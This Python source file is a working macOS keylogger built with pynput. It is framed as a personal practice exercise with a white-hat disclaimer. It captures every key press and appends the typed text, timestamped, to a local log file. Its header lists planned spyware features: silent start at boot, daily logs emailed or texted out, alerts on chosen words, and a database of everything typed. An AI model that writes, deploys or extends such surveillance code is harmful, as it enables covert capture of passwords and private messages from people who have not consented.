# Author: Grace C.
# Program: keylogger.py
# Language: Python 3.8.2
# Disclaimer: If you use this software, you agree to only use it for learning or white hat purposes.

# Purpose: This was a practice exercise to see if I could write a keylogger on MacOS. It works!
# However, due to MacOS security, it requires to be run as root and it must be white listed in the settings.
# Regardless, once the script was white listed, all keyboard input typed can be logged.
# For more information on Pynput limitations: https://pynput.readthedocs.io/en/latest/limitations.html

# Future ideas:
# - Quietly start the script when the installed machine starts
# - Feature to send a daily log to a specified email or phone number
# - Text or email alerts triggered by certain words
# - Create a database. Store all key presses and their frequency. Store all words typed and their frequency
# - Make a dashboard that explores the data

import pynput
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Button, Controller
from datetime import datetime

# Where we'll store key characters pressed
keys_logged = []

# Current date and time
now = datetime.now()

# Function to quickly grab the date and time for use in a string.
def get_time():
    return now.strftime("%m/%d/%Y, %H:%M:%S")

# When a key is pressed, append it to our list of keys_logged
def on_press(key):
    try:
        keys_logged.append(key.char)
    except AttributeError:
        keys_logged.append(key)

def on_release(key):
    # Press the escape key to end the program and update the log file. If this is not pressed, the log doesn't save.
    if key == keyboard.Key.esc:
        update_log_file(keys_logged) # Update the log file

def parse_keys(keys_logged):
    # Replace all Key.space elements in the list with a blank space String for readability.
    keys_logged = [' ' if (isinstance(x, keyboard.Key) & (x == keyboard.Key.space)) else x for x in keys_logged]
    # Replace other Key elements in the list to improve logging readability. This will strip out special buttons that were pressed.
    # Our goal is mainly to have a log of readable text input.
    keys_logged = ['' if (isinstance(x, keyboard.Key)) else x for x in keys_logged]
    # Transform the list into a readable string.
    parsed_text = ''.join(map(str, keys_logged)) 
    return parsed_text
    
# Append new key log text to the end of log.txt
def update_log_file(keys_logged):
    log_file = open('log.txt', 'a')
    log_file.write('\n====================================\n')
    log_file.write('\n' + get_time() + '\n') # Time stamp
    log_file.write(str(parse_keys(keys_logged))) # What was recorded and parsed for readability
    log_file.write('\n====================================\n')
    log_file.close()
    
# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
